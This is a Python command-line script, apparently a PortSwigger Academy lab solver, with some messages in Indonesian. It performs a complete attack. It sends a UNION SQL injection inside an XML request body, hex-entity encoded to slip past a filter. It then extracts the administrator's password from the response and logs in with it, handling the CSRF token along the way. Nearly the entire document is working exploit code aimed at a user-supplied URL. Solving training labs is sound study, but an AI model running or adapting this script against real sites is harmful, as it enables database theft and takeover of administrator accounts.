#!/usr/bin/python3
"""
PortSwigger Lab Solver
SQLi via XML body with Hackvertor hex_entities bypass
+ auto-login as administrator
"""
import sys
import re
import argparse
import httpx
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Interface:
    def __init__(self):
        self.red    = '\033[91m'
        self.green  = '\033[92m'
        self.white  = '\033[37m'
        self.yellow = '\033[93m'
        self.bold   = '\033[1m'
        self.end    = '\033[0m'

    def header(self):
        print('\n    >> SQLi via XML body with Hackvertor hex_entities bypass')
        print('    >> by Port Swigger Academy\n')

    def info(self, message):
        print(f"[{self.white}*{self.end}] {message}")

    def warning(self, message):
        print(f"[{self.yellow}!{self.end}] {message}")

    def error(self, message):
        print(f"[{self.red}x{self.end}] {message}")

    def success(self, message):
        print(f"[{self.green}\u2713{self.end}] {self.bold}{message}{self.end}")


output = Interface()
PROXY_URL = "http://127.0.0.1:8080"
TARGET_USER = "administrator"


# --- Hackvertor encoders ---------------------------------------------------
def hex_entities(s: str) -> str:
    """Equivalent of Hackvertor's <@hex_entities>...<@/hex_entities>."""
    return "".join(f"&#x{ord(c):x};" for c in s)


def dec_entities(s: str) -> str:
    """Equivalent of Hackvertor's <@dec_entities>...<@/dec_entities>."""
    return "".join(f"&#{ord(c)};" for c in s)


# --- Response parser -------------------------------------------------------
def extract_password(body: str, username: str = TARGET_USER):
    """Ambil password untuk username tertentu dari response 'user~pass'."""
    pattern = rf"^{re.escape(username)}~(\S+)\s*$"
    m = re.search(pattern, body, re.MULTILINE)
    return m.group(1) if m else None


# --- Stage 1: SQLi exploit -------------------------------------------------
def sqli_xml_encode(client: httpx.Client, url: str):
    path = '/product/stock'
    sqli_payload = "1 UNION SELECT username || '~' || password FROM users"
    encoded = hex_entities(sqli_payload)

    xml_body = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<stockCheck>'
            '<productId>1</productId>'
            f'<storeId>{encoded}</storeId>'
        '</stockCheck>'
    )

    headers = {
        "Content-Type": "application/xml",
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/146.0.0.0 Safari/537.36"
        ),
        "Accept":  "*/*",
        "Origin":  url,
        "Referer": f"{url}/product?productId=1",
    }

    output.info(f"Target   : {url}{path}")
    output.info(f"Payload  : {sqli_payload}")
    output.info(f"Encoded  : {encoded[:80]}{'...' if len(encoded) > 80 else ''}")

    try:
        r = client.post(url + path, content=xml_body, headers=headers)
    except httpx.RequestError as e:
        output.error(f"Request error: {e}")
        return None

    output.info(f"HTTP {r.status_code}  ({len(r.content)} bytes)")
    return r.text


def dump_credentials(body: str):
    if not body:
        output.error("Empty response body.")
        return None

    print()
    output.info("Raw response:")
    print("-" * 60)
    print(body.strip())
    print("-" * 60)
    print()

    password = extract_password(body, TARGET_USER)
    if password:
        output.success(f"Username : {TARGET_USER}")
        output.success(f"Password : {password}")
        return password

    output.warning(
        f"Username '{TARGET_USER}' tidak ditemukan di response. "
        "Cek raw output atau sesuaikan payload."
    )
    return None


# --- Stage 2: Login flow ---------------------------------------------------
def get_csrf_token(client: httpx.Client, url: str):
    """GET /login dan extract CSRF token via name='csrf'."""
    try:
        r = client.get(url + "/login")
    except httpx.RequestError as e:
        output.error(f"Failed to GET /login: {e}")
        return None

    if r.status_code != 200:
        output.error(f"GET /login returned HTTP {r.status_code}")
        return None

    soup = BeautifulSoup(r.text, "html.parser")
    token_input = soup.find("input", attrs={"name": "csrf"})
    if not token_input or not token_input.get("value"):
        output.error("CSRF token tidak ditemukan di /login.")
        return None

    return token_input["value"]


def login_as_administrator(client: httpx.Client, url: str, password: str):
    csrf = get_csrf_token(client, url)
    if not csrf:
        return False

    output.info(f"CSRF token: {csrf}")

    data = {
        "csrf":     csrf,
        "username": TARGET_USER,
        "password": password,
    }

    try:
        r = client.post(url + "/login", data=data)
    except httpx.RequestError as e:
        output.error(f"Login request error: {e}")
        return False

    return "Log out" in r.text or "/my-account" in str(r.url)


# --- CLI -------------------------------------------------------------------
def parse_args():
    parser = argparse.ArgumentParser(
        description="PortSwigger SQLi via XML + Hackvertor hex_entities bypass",
    )
    parser.add_argument("url", help="Target URL (https://...)")
    parser.add_argument("--proxy", action="store_true",
                        help=f"Route traffic via {PROXY_URL}")
    return parser.parse_args()


# --- Main ------------------------------------------------------------------
def main():
    output.header()
    args = parse_args()

    url = args.url.strip().rstrip('/')
    if not url.startswith(("http://", "https://")):
        output.error("URL harus diawali http:// atau https://")
        sys.exit(1)

    proxy = PROXY_URL if args.proxy else None
    if proxy:
        output.warning(f"Routing via proxy {proxy}")

    output.info("Looking for a users table...")

    # Single client untuk seluruh flow → cookies persist otomatis antar stage
    with httpx.Client(
        proxy=proxy,
        verify=False,
        http2=False,
        follow_redirects=True,
        timeout=httpx.Timeout(15.0, connect=10.0),
    ) as client:

        # Stage 1: SQLi → extract password
        body = sqli_xml_encode(client, url)
        password = dump_credentials(body)

        if not password:
            output.error("Aborting: tidak ada password yang berhasil di-extract.")
            sys.exit(1)

        # Stage 2: Login dengan creds yang di-extract
        print()
        output.info(f"Attempting login as {TARGET_USER}...")
        if login_as_administrator(client, url, password):
            output.success(f"Login berhasil sebagai {TARGET_USER}!")
            output.success(f"Akses: {url}/my-account")
        else:
            output.error("Login gagal. Cek password atau CSRF flow.")
            sys.exit(1)


if __name__ == "__main__":
    main()